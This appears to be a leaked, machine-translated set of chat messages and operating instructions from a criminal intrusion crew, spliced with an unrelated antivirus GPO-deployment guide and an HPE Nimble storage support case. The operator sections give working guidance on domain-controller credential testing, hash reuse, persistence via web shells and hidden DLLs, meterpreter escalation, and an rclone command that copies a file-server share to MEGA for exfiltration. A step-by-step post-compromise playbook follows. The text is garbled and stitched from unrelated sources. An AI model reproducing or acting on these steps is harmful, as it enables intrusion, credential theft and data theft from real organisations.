Message: so, gentlemen, for questions

1. smb_login with credits on the DC / net use on the DC / login to Outlook or webmail (if domain authorization is attached) / ldap_login (https://github.com/lanjelot/patator) for example by a patator
2. The first part is a rudimentary LM hash, you can safely forget about what it is with us, it was and will always be the same, the second is NTLM hash, in fact, the one that we often use for authorization
3. It will be later, you can set tasks through the admin panel on decrypt hashes and brute force of keypasses / docks / excels
4. https://github.com/0xthirteen/StayKit - all pinning techniques are described here and divided into categories and by privilege level, there is nothing more detailed here, there have been no "unique" techniques for Windows systems for years. There are alternative things like web shells on a web server (this is aspx code that is hosted on a web server, in this case IIS where a functional application "lives" - most often and most conveniently uploaded to an exchange), there is an IIS module. For now, stop at stay-kit'e because it gives understanding, in the future I will simply give you a convenient tool for fixing simply by running the dll
5. everything that is in the network is administered by people. the key to obtaining the most detailed data about the investigated IS lies with the admins/network engineers. These are digrams and accesses and everything else. You can identify cloud or taped backups only through them or by indirect signs (services / tasks on critical servers, entries in hell, etc.)
6. the question is incorrect. you don't "need" to do it, smb_pipe is basically just a type of load that is +- technically equal to bind payload in metasploit, used for machines with authorization restrictions or for machines that are not able to pipe out with standard http(s)/dns/tcp protocol, that is, jump psexec (_psh) 10.0.0.1 pipe is the creation of a service for the bind pipe, through which the initiating machine will then connect
7. I will issue a builder dll files
8. You now have like three, do you need more? if yes - tell me which servers and how many do you need
9. And what hangs? I do not know.

Using GPO for Deployment

To install SecureAnywhere using GPO, you should have experience with Microsoft's Active Directory and the GPO editor.

You can also watch a video on how to use GPO at How to Deploy Using Group Policy - SecureAnywhere Business.

To install SecureAnywhere using GPO:

From the following location, download the SecureAnywhere MSI installer to a network share:

http://anywhere.webrootcloudav.com/zerol/wsasme.msi

Downloading the file makes it accessible to all endpoints on which you will deploy SecureAnywhere.

Go to the server that is the domain controller for the deployment group.
Open the GPO editor on the domain controller and create a policy for the deployment group.
Assign SecureAnywhere to all endpoints that belong to the Organizational Unit where the Group Policy is created.

SecureAnywhere installs on the endpoints in the group when they restart.

There is no vulnerability on MS17:

```

I threw it into the meterpreter through the multihandler:
`getsystem` - by

bypassuacs - everyone swears like this:
`Not in admins group, cannot escalate with this module`
Either like this:
`not-vulnerable: Target is not vulnerable`

Tried this (This module attempts to exploit existing administrative privileges to obtain a SYSTEM session)
It didn't help much either:

I would like to pick up at least some red word, but I will only answer ... anecdote!

A pentester is walking through the desert, he wants sex, well, he just can't bear it, he met a genie, and he asks him "What do you want, traveler?"
- To fuck - says the pentester
And then PUZZHZH from nowhere appears a bunch of all sorts of spheres without credits, non-decrypting hashes on kmd5, grids in which the domain is not visible and a billion all kinds of avers

- Well, fuck - the genie answers him

no need for any 7za and mega unarchiving now! everything is very quiet and imperceptible!

download rklon from the site. We put rclon.exe in the dira we need, then everything is according to the manual. I did everything through rdp
a mega, choose it from a huge list that rklon provides us with . rklon quietly cuts to mega and makes a clone of what you need. you can at least just fs. downloads everything through rklon, so the download speed is high.

here is the guide. everything is simple here
https://rclone.org/mega/

next download command

rclone.exe copy "\\FS\" remote:NT -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12

remote:NT - only change this.
"remote" is the name of your mega.
"NT" is your directory in the mega where it will be downloaded, if it does not exist, it will create it itself.

example

rclone.exe copy "\\trucamtldc01\E$\Data" remote:Data -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12

Message: ```
The following snapshots listed under volumes or snapshot collections listed under volume collections are not considered *unmanaged* by the Case Automation rules because they are managed by a different process than a retention policy:
a) Triggered by user action; these are considered *manual* snapshots
b) Triggered by third party software, the REST API, or a script; these are considered *externally triggered* snapshots
c) Triggered by HPE Nimble Storage Array due to a user action, such as volume restore, resize, promote, demote; these are considered *manual* snapshots
d) Triggered by an agent (such as VMware VVOL); these are considered *externally triggered* snapshots
e) Triggered by *handover* action; these snapshots are considered *manual* snapshots but currently managed by the retention schedule and require no user action

In situation where the condition above is not resolved, the Case Automation will open another case after the time period defined as "Sleep Time"
Default "Sleep Time" for the Unmanaged Snapshot(s) Case Automation is 12 days, but may be changed, if so desired.
If the Array Group was updated to NimbleOS 5.1.x for over 90 days and unmanaged snapshots are over 90 days old, those snapshots will no longer trigger Case Automation to avoid repeat notification.
If you wish to no longer have cases opened nor receive case notifications for this alert type, you may disable this alert from generating cases completely for your array as follows: login to the HPE InfoSight Web Portal at http://infosight.hpe.com / Under the wellness tab,
* Click the "Configure Wellness Rules" button
* To disable case creation and notification for all arrays, uncheck the "Create Issue?" checkbox next to the rule named "Condition Name"
* To disable case creation and notification for a specific array:
* Expand the "Condition Name" rule by selecting the "+" sign next to the rule name
* Uncheck the "Create Issue?" checkbox next to a specific serial number.

NOTE: After the automatic case generation has been disabled (removed) for a certain condition, there will not be any more automatic cases created until the case generation is re-enabled manually.

If you have additional questions or require assistance, please reply to this email and an HPE Nimble Storage Support engineer will reach out to you. If you choose to contact HPE Nimble Storage Support by phone regarding this issue, please be sure to provide the case number in order to facilitate a rapid resolution.

* Nimble OS $ snap --list --all --unmanaged
* ### cut for brevity ###
* v1 vc1-vc1s1-2019-04-29::17:56:00.000 10 No Okay unknown default:/ N/A
* v2 vc1-vc1s1-2019-04-29::17:56:00.000 10 No Okay unknown default:/ N/A

b) Choose appropriate value for the expiration of the unmanaged snapshots and check which snapshots already expired, which ones will expire and when.

NOTE: Negative value shows when snapshots would have already expired, positive value show in what amount of time the snapshots will expire based on value and units checked.

* Nimble OS $ group --autoclean_unmanaged_snapshots check --snap_ttl <numeric_value> --snap_ttl_unit <unit>

Example:
* Nimble OS $ group --autoclean_unmanaged_snapshots check --snap_ttl 24 --snap_ttl_unit hours
* ### cut for brevity ###
* v1 vc1-vc1s1-2019-04-29::17:56:00.000 default:/ +23.96 hours
* v2 vc1-vc1s1-2019-04-29::17:56:00.000 default:/ +23.96 hours

c) Select snapshots which you prefer to keep for longer than the rest of unmanaged snapshots and edit the TTL value directly. This can be done on the snap and snapcoll levels.

* Nimble OS $ snap --edit <snapshot_name> --vol <volume_name> --ttl <numeric_value> --ttl_unit <unit>

Example:
* Nimble OS $ snap --edit vc1-vc1s1-2019-04-29::17:56:00.000 --vol v1 --ttl 60 --ttl_unit days

d) Change TTL to enabled state and choose appropriate units and value of units.

NOTE: It is recommended to select expiry unit value higher than any other currently present schedule in order to ensure snapshots have enough retention as required.

* Nimble OS $ group --autoclean_unmanaged_snapshots yes --snap_ttl <numeric_value> --snap_ttl_unit <unit>

Example:
* Nimble OS $ group --autoclean_unmanaged_snapshots on --snap_ttl 30 --snap_ttl_unit days
* INFO: Snapshot Time-to-live is set to 30 days.

e) Verify the list of unmanaged snapshots has had expiry time updated as desired:

* Nimble OS $ snap --list --unmanaged --all
* ### cut for brevity ###
* v1 vc1-vc1s1-2019-04-29::17:56:00.000 10 No Okay unknown default:/ +8.57 weeks
* v2 vc1-vc1s1-2019-04-29::17:56:00.000 10 No Okay unknown default:/ +4.29 weeks

Case Number: 04124985
Case Priority: P3
Case Category: Snapshots
Case Origin: Auto support

Case Subject: Unmanaged snapshot(s) have been detected due to configuration change Case Description: PLEASE NOTE: This is an automatically closed case, if condition is expected, no reply is required.
Additional information regarding the issue described below is available to you in the form of an HPE InfoSight Knowledge Base (KB) article. Articles are hosted from the HPE InfoSight portal.

HPE Nimble Storage Case Automation has detected unmanaged snapshot(s) on your array.
The snapshot(s) became *unmanaged* due to a configuration change of the volume collection, schedule, or volume association to a volume collection.
In certain situations, snapshot(s) on the downstream replication partner could become unmanaged due to a name change of the volume collection or a schedule on the upstream replication partner.
Because the affected snapshot(s) are no longer managed by a schedule, they will remain on the array indefinitely unless Time-To-Live (TTL) feature will be enabled or until they have been removed/deleted manually.
As changes accumulate in the parent volume, the snapshot(s) will consume increasing amounts of space.

There are a few considerations regarding the deletion of unmanaged snapshots; please ensure to review the KB article attached to this case for more details.

To avoid these cases in the future, you may enable Time-To-Live feature (TTL), which is available as of NimbleOS 5.1.x.
The feature will expire the snapshots which are considered unmanaged automatically based on the set period of time.
TTL is enabled manually by the user via CLI only. The following are the recommended steps to enable the feature:

a) List current snapshots which are unmanaged, note that current expiry is set to "N/A" such as in the example:

1. Collection of primary information about the domain and the environment
	- Full domain name
	-DCs list
	- LA\DA\EA
	- Password policy
	-PS
	-EDR
	- Systeminfo
based on the information received, we look at what kind of network is in front of us: workgroup with vpn, av lab, work network. If it is impossible to draw a conclusion based on the data from step 1, go to step 2

2. Collection of information about blood pressure
	-ADFind
	- ADFind trust
if the total size of the files is more than 40mb, then you need to put them in the archive. After analyzing blood pressure, we draw a conclusion about the type of network. If the workgroup is without domain visibility, skip and take the trail. network to work. If a full-fledged network, go ahead

3. Collecting additional information about the domain and the environment
	- Dump browsers
	- Seatbelt
	- kerberoast, asreproast
	- DuzzleUP
	- WinPEAS
	- Watson
	- GPP
	- ShareFinder
	- Check Zero Logon
all the files in the process and the logs into a folder with the name of the external network domain, under the names corresponding to the utilities that you ran. Hashes for brute you pass to team lead 2

4. Add. actions. During the execution of ShareFinder, we run a persistence on the entry point (ONLY IF IT HAS BEEN TOLD IN ADVANCE)
	- we generate a NEW build for EVERY launch
	- hide dll in user folders (preferably appdata and as far as possible)
	- run, check if the dll has been deleted + if the shell has appeared, write to me: host name, launch rights

all files are duplicated in the conf, and are also added to a separate folder locally. You put information about DC, LA, DA, EA, and all passwords found in the process into a separate file creds.txt

5. If during or after the completion of ShareFinder, as well as a quick hash brute, you get the opportunity to get out of the entry point, then we use this inapplicably. Such a network gets a priority and is not interrupted in operation.
